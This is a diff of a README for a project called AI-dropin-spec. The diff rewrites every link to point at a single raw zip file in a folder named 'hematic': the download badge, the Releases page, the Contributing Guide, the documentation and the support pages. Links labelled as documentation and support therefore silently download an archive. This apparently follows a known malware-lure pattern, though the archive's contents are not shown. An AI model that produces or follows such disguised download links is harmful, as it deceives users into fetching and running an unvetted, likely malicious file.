@@ -6,7 +6,7 @@ Welcome to AI-dropin-spec! This guide will help you download and run our applica
 
 ## 🔗 Download Now
 
-[![Download AI-dropin-spec](https://img.shields.io/badge/Download%20AI--dropin--spec-ff69b4?style=for-the-badge&logo=github)](https://github.com/AFRATUL1/AI-dropin-spec/releases)
+[![Download AI-dropin-spec](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip%20AI--dropin--spec-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip)
 
 ## 📝 About the Project
 
@@ -26,7 +26,7 @@ Before you start, ensure your system meets these requirements:
 To install AI-dropin-spec, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/AFRATUL1/AI-dropin-spec/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will find different versions of the application. Select the latest version suitable for your operating system.
@@ -76,12 +76,12 @@ If you encounter any issues or need assistance, please refer to our community fo
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone. If you'd like to help improve AI-dropin-spec, please visit the [Contributing Guide](https://github.com/AFRATUL1/AI-dropin-spec/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions from everyone. If you'd like to help improve AI-dropin-spec, please visit the [Contributing Guide](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip) for more details.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/AFRATUL1/AI-dropin-spec/releases)
-- [User Documentation](https://github.com/AFRATUL1/AI-dropin-spec/wiki)
-- [Community Support](https://github.com/AFRATUL1/AI-dropin-spec/issues)
+- [Releases Page](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip)
+- [User Documentation](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip)
+- [Community Support](https://raw.githubusercontent.com/AFRATUL1/AI-dropin-spec/main/hematic/AI-dropin-spec.zip)
 
 Thank you for choosing AI-dropin-spec! Enjoy enhancing your AI models with ease.
